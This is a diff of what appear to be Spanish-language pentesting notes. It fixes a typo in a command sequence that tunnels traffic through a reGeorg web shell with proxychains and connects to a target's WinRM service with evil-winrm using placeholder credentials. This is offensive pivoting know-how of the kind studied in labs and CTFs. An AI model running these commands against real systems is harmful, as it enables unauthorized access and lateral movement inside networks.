@@ -124,7 +124,7 @@ python2 reGeorgeSocksProxy.py -u <path/to/fileuploaded> -p <puerto>
 #Ejecuto el comando aspecificando la url en la que esta subido el tunnel.X especificando un puerto para escucha
 socks4 127.0.0.1 1234
 #Configuracion en proxychains
-proxychains wvil-winrm -i 127.0.0.1 -u "usr" -p "pwd"
+proxychains evil-winrm -i 127.0.0.1 -u "usr" -p "pwd"
 #Usando proxychains podemos mandar los paquetes a donde escucha ReGerog y acceder a X cosa (en este caso un winrm local del target)
 
 ----------      ----------      ----------      ----------
